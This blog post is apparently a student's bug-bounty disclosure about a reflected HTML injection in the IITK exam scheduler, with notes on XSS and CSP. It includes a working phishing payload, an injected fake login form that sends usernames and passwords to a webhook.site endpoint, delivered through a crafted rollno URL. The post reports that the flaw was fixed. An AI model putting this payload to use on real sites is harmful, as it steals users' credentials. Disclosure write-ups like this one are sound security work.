---

layout: post
title: "Hacking IITK Exam Scheduler"
date: 2025-03-26 19:30:00 +0530
authors: Siddhesh Mande
tags:
- IITK
- Infosec
- Bug Bounty
image:
  url: /images/programming-code-lang.jpg
---

# Hacking the IITK Exam Scheduler to Steal User Credentials

Have you ever looked at a simple college portal and thought, "Could I hack this?" 

If you've spent any time around web security, you've probably heard that "user input is dangerous." It sounds a bit overused, until you see just how far a single unsanitized parameter can go. In this case, all it took was a roll number field to turn a harmless exam scheduler into a phishing delivery system.

# Understanding the Attack Surface
At its core, web hacking is the art of making a web application do something it wasn't meant to do. A general workflow is as follows:

1. User provides input (a search term, a password, clicking a button).
2. Server processes that input.
3. Server returns an output (search results, a profile page).

Most hacking happens when the server trusts the user input a little too much.

### HTML Injection vs. XSS
You'll hear these terms a lot. Here’s the difference:

- HTML Injection: This is when you can "inject" your own HTML tags into a page. If you can make a word bold or create a new `<div>`, you've found an injection point.

- Cross-Site Scripting (XSS): This is a much more dangerous form of HTML injection. It’s when you inject `<script>` tags to execute JavaScript in another user's browser. JavaScript can be used to steal cookies, capture keystrokes, or redirect users. 

### The Defense: Content Security Policy (CSP)
Modern websites use a Content Security Policy (CSP) as a safety net. It defines rules that allow only some specific authorized sources to run JavaScript. Even if a hacker manages to inject a script, a well-configured CSP prevents the browser from running it.

Modern frameworks like React have built-in protections (like auto-escaping), but they aren't bulletproof. Developers must still follow safe practices, like manual input sanitization.

## The Entry Point: Finding the Flaw

The [exam scheduler portal](http://172.26.131.10/examscheduler/) does not use any modern framework, making it more prone to classic vulnerabilities. Notice that when you enter your roll number, it is "reflected" back on the page along with your exam schedule.

Now here's the first flaw: it trusts the user too much. It expects a numeric roll number but actually accepts everything: letters, special characters, etc.

This unsanitized reflection is exactly what we need for an HTML injection or even XSS. So I tested with a few basic tags:

- `<i>hello</i>` rendered as <i>hello</i>
- `<style>body{background:red!important}</style>` made the complete background red

Boom. We have an HTML injection here.

Before we proceed, note that all this happens only on the "client" side, that is, only on the browser where these tags were injected. No other users would be affected, so the attacker's goal is to find a way to deliver these automatically into a victim's session.

Next, I tried to escalate it to XSS with the classic payload:
- `<script>alert(1)</script>` (pop an alert to check if JavaScript executes) and nothing happened...

The headers revealed why:

`content-security-policy:
script-src 'self';`

Remember the CSP I mentioned earlier? It allows only the JavaScript coming from the server to run, effectively blocking our inline script. No XSS then. 

> [This game](https://xss-game.appspot.com/) is a fun way to practice XSS, protecting against it and bypassing weak defenses.

The end? No. While it strictly controlled script execution, it didn’t place any limitations on form submissions. That meant the browser was still free to send user-entered data to any external endpoint.

This subtle gap completely changed the direction of the attack.

Instead of trying to force the browser to execute malicious code, I could simply let the user do the work themselves.

# Turning Injection into an Attack

With HTML injection already confirmed, it became possible to insert arbitrary interface elements into the page. That includes forms. And forms, by design, collect and transmit user data.

### The Payload
So I crafted a simple payload: a fake login prompt embedded directly into the page.

```HTML
<p>Login required</p>
<form action=https://webhook.site/[unique-id] method=GET>
  <input type=text name=username placeholder=username>
  <input type=password name=password placeholder=password> <input type=submit>
</form>
```

> Webhook sets up a temporary listener to show network logs.

The code is not really that sophisticated. It doesn’t rely on JavaScript, doesn’t attempt to bypass CSP, and doesn’t exploit any browser quirks. It simply leverages the trust users place in the interface they see.

### The Transmission
Of course, injecting HTML isn’t useful unless it can be delivered to a victim. By analyzing the network traffic, I discovered that upon submitting the roll number, a request is sent with the roll number as the parameter:
`http://172.26.131.10/examscheduler/personal_schedule.php?rollno=250630`

Since the rollno parameter is reflected directly, it can be replaced with a URL-encoded version of the malicious payload. The result is a crafted link that contains the entire attack within it.
`http://172.26.131.10/examscheduler/personal_schedule.php?rollno=%3Cp%3ELogin+required...[encoded_form]...form%3E`

When a victim opens this link, the application behaves exactly as expected, except the reflected content now includes the injected form. There are no warnings, no obvious signs of tampering, and no need for additional interaction beyond clicking the link.

![Fake Login UI](/images/exam_scheduler.png)

Once the victim enters their credentials and submits the form, the browser sends that data straight to the attacker-controlled endpoint specified in the action attribute.

![Webhook Demo](/images/webhook.png)

What makes this effective is not technical complexity, but the combination of small oversights.

The application trusted user input enough to reflect it without sanitization. The CSP, while correctly implemented for scripts, did not account for other vectors like form submission. And most importantly, the attack relied on user trust in the exam scheduler rather than forcing execution through code.

Each of these elements on its own might not seem critical. Together, they create a seamless exploitation path.

# Fixes
 **The vulnerability was reported and has been addressed by the web security team.**

Input validation now restricts special characters, and the parameter is properly constrained. These are straightforward changes, but they highlight an important lesson: even simple validation can prevent entire classes of attacks.

# Final Thoughts

This wasn’t about breaking encryption or bypassing authentication systems. It was about understanding how different parts of a web application interact and where those interactions can be manipulated.

The best exploits don’t always require advanced zero-days or massive payloads. Often, they just exploit a subtle logic gap and the inherent trust users place in a legitimate domain. Sometimes, all it takes is a single URL.

But this is just the tip of the iceberg—hacking involves many other subdomains and hundreds of types of vulnerabilities waiting to be exploited. Maybe a new one is dropping as you read this...

Stay alert, stay ethical, and happy hacking! 

Author: Siddhesh Mande
